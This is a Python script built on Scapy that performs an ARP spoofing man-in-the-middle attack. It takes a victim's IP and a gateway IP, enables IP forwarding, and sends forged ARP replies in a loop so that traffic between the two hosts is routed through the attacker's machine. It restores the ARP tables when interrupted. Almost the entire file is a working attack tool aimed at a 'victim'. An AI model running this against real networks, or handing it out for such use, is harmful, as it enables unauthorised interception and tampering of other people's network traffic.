from scapy.all import Ether, ARP, srp, send
from time import sleep
import argparse
import os

def argparser() -> argparse.Namespace:
    parser = argparse.ArgumentParser()

    try:
        parser.add_argument("target_ip", type=str, help="Victim's ip")
        parser.add_argument("host_ip",  type=str, help="Router's/Gateway ip")
    except argparse.ArgumentError as e:
        print(e)

    return parser.parse_args()

def _enable_ipRoute_linux() -> None:
    ## Enable IP routing on a Linux machine

    ## This file has only a number to indicate if routing is enabled:
    ## 0 = Disabled
    ## 1 = Enabled
    file_path = "/proc/sys/net/ipv4/ip_forward"

    with open(file_path) as file:
        forwarding_status = file.read().strip()
        if forwarding_status == 1:
            return
    
    with open(file_path, "w") as f:
        f.write("1\n")

def _enable_ipRoute_windows() -> None:
    ## Enabling IP rounting on a Windows machine
    from services import WService

    service = WService("RemoteAccess")
    service.start()

def enable_ipRoute() -> None:
    print(">> Enabling IP Routing")
    _enable_ipRoute_windows() if "nt" in os.name else _enable_ipRoute_linux()
    print(">> IP Routing enabled")

def _get_mac(ip: str) -> str | None:
    ## Build a packet that asks which MAC is associated with the requested IP
    ## By sending a broadcast request, only the machine with the requested IP will answer
    ans, _= srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].hwsrc

def spoof(tIp: str, hIp: str) -> None: ## Victim's IP, Who the victim will think I'm
    ## Creates an ARP "is-at" request that associates the host_ip with the attacker MAC
    ## To the victim, the attacker is the host
    arp_response = ARP(pdst=tIp, hwdst=_get_mac(tIp), psrc=hIp, op="is-at")

    send(arp_response, verbose=0)
    print(f">> Sent to {tIp} : {hIp} is at {ARP().hwsrc}")

def restore(tIp: str, hIp: str) -> None: ## Victim's IP, Host's IP
    ## Restores the network back to normal by sending the correct infos of the host to the victim
    arp_response = ARP(pdst=tIp, hwdst=_get_mac(tIp), psrc=hIp, hwsrc=_get_mac(hIp))

    send(arp_response, count=7, verbose=0)
    print(f">> Sent to {tIp} : {hIp} is at {_get_mac(hIp)}")

def main() -> None:
    args = argparser()
    enable_ipRoute()
    try:
        while True:
            ## Associates, to the victim, the Router's IP with the attacker MAC
            spoof(args.target_ip, args.host_ip)

            ## Associates, to the router, the Victim's IP with the attacker MAC
            spoof(args.host_ip, args.target_ip)

            sleep(1)
    except KeyboardInterrupt:
        print(">> Restoring network back to normal")

        ## Corrects the ARP table of the victim
        restore(args.target_ip, args.host_ip)

        ## Corrects the ARP table of the router
        restore(args.host_ip, args.target_ip)

if __name__ == "__main__":
    main()

